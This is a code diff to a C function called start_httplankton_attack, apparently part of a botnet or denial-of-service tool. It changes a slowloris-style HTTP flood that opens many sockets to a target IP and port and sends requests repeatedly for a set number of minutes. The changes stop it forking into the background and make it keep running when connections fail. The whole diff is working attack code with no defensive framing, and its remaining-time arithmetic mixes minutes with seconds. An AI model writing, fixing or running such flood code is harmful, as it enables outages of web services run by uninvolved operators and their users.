@@ -57,29 +57,13 @@ void setup_connection(int index, char *target_ip, int target_port)
 
 void start_httplankton_attack(char *target_ip, int target_port, int duration)
 {
-    pid_t httplankton_pid = fork();
-
-    if (httplankton_pid < 0)
-    {
-#ifdef DEBUG
-        printf("[HTTPlankton] Error during fork\n");
-#endif
-        return;
-    }
-
-    if (httplankton_pid != 0)
-    {
-#ifdef DEBUG
-        printf("[HTTPlankton] HTTP Attack started with process ID: %d\n", httplankton_pid);
-#endif
-        return;
-    }
 
     int duration_seconds = duration * 60; // Convert minutes to seconds
     time_t start = time(NULL);
 
 #ifdef DEBUG
-    printf("[HTTPlankton] Starting HTTPlankton attack on %s:%d for %d minutes\n", target_ip, target_port, duration);
+    printf("[HTTPlankton] Starting HTTPlankton attack on %s:%d for %d minutes\n", 
+        target_ip, target_port, duration);
 #endif
 
     for (int i = 0; i < CONNECTIONS; i++)
@@ -92,12 +76,23 @@ void start_httplankton_attack(char *target_ip, int target_port, int duration)
 #ifdef DEBUG
             printf("[HTTPlankton] Failed to setup connection %d\n", i);
 #endif
-            exit(1); 
+            continue;
         }
     }
 
-    while (time(NULL) - start < duration_seconds)
+    while (1)
     {
+        time_t elapsed = time(NULL) - start;
+        int remaining = duration - elapsed;
+        
+        if (elapsed >= duration_seconds) 
+        {
+#ifdef DEBUG
+            printf("[HTTPlankton] Attack time completed (%d seconds). Stopping...\n", duration_seconds);
+#endif
+            break; 
+        }
+        
         for (int i = 0; i < CONNECTIONS; i++)
         {
             if (sockets[i] < 0)
@@ -110,10 +105,11 @@ void start_httplankton_attack(char *target_ip, int target_port, int duration)
 #ifdef DEBUG
                     printf("[HTTPlankton] Connection %d failed again\n", i);
 #endif
-                    exit(1);
+                    continue;
                 }
             }
 
+            /* Send the first part of req without close it (slowloris) */
             const char *request = "GET / HTTP/1.1\r\nHost: target\r\nX-a: b\r\n\r\n";
             if (send(sockets[i], request, strlen(request), 0) < 0)
             {
@@ -123,7 +119,7 @@ void start_httplankton_attack(char *target_ip, int target_port, int duration)
         }
 
 #ifdef DEBUG
-        printf("[HTTPlankton] Active connections... Continuing attack\n");
+        printf("[HTTPlankton] Active connections... Continuing attack -%d seconds\n", duration_seconds - remaining);
 #endif
 
         sleep(SLEEP_TIME); 
